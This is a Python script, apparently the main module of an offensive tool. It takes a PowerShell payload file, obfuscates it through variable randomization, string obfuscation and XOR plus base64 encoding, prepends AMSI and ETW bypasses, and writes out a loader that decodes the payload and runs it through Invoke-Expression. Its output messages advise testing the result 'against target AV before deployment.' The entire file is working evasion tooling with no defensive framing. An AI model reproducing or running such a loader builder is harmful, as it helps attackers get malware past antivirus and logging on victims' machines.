#!/usr/bin/env python3
import sys
import base64
from core.encoder import XOREncoder
from core.variable_randomizer import VariableRandomizer
from core.string_obfuscator import StringObfuscator
from bypasses.amsi import AMSIBypass
from bypasses.etw import ETWBypass
from utils.helpers import RandomGenerator

class AdvancedObfuscator:
    """Main obfuscator coordinating all techniques"""
    
    def __init__(self):
        self.encoder = XOREncoder()
        self.var_randomizer = VariableRandomizer()
        self.string_obf = StringObfuscator()
    
    def obfuscate_powershell(self, code):
        """Apply all obfuscation techniques"""
        print("[*] Randomizing variables...")
        obfuscated = self.var_randomizer.randomize_variables(code)
        
        print("[*] Obfuscating strings...")
        obfuscated = self.string_obf.obfuscate_strings(obfuscated)
        
        print("[*] Randomizing command case...")
        obfuscated = self.string_obf.randomize_case(obfuscated)
        
        return obfuscated
    
    def create_loader(self, payload_code, include_bypasses=True):
        """Create fully obfuscated loader with bypasses"""
        loader = ""
        
        # Add bypass techniques
        if include_bypasses:
            print("[*] Adding AMSI bypass...")
            loader += "# Disable AMSI\n"
            loader += AMSIBypass.get_obfuscated_bypass() + "\n\n"
            
            print("[*] Adding ETW bypass...")
            loader += "# Disable ETW\n"
            loader += ETWBypass.get_bypass() + "\n\n"
        
        # Encode payload
        print("[*] Encoding payload...")
        encoded = self.encoder.encode(payload_code)
        encoded_b64 = base64.b64encode(encoded).decode()
        key = self.encoder.get_key()
        
        # Create decoder
        decoder_stub, func_name = self.encoder.create_decoder_stub()
        
        var_payload = RandomGenerator.random_string()
        var_key = RandomGenerator.random_string()
        var_code = RandomGenerator.random_string()
        
        loader += decoder_stub + "\n\n"
        loader += f"${var_payload} = \"{encoded_b64}\"\n"
        loader += f"${var_key} = {key}\n"
        loader += f"${var_code} = {func_name} ${var_payload} ${var_key}\n"
        loader += f"Invoke-Expression ${var_code}\n"
        
        return loader
    
    def obfuscate_file(self, input_file, output_file, include_bypasses=True):
        """Obfuscate PowerShell file"""
        print(f"[*] Reading payload: {input_file}")
        
        with open(input_file, 'r') as f:
            payload = f.read()
        
        # Obfuscate
        obfuscated = self.obfuscate_powershell(payload)
        
        # Create loader
        print("[*] Creating obfuscated loader...")
        loader = self.create_loader(obfuscated, include_bypasses)
        
        # Save
        with open(output_file, 'w') as f:
            f.write(loader)
        
        print(f"[+] Obfuscated payload saved: {output_file}")
        print("\n[!] Note: Test against target AV before deployment")
        print("[!] Signatures change frequently")

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 main.py <payload_file> [output_file]")
        print("Example: python3 main.py payloads/shell.ps1")
        print("Example: python3 main.py payloads/shell.ps1 obfuscated_shell.ps1")
        sys.exit(1)
    
    input_file = sys.argv[1]
    output_file = sys.argv[2] if len(sys.argv) > 2 else input_file.replace('.ps1', '_obfuscated.ps1')
    
    obfuscator = AdvancedObfuscator()
    obfuscator.obfuscate_file(input_file, output_file)

if __name__ == "__main__":
    main()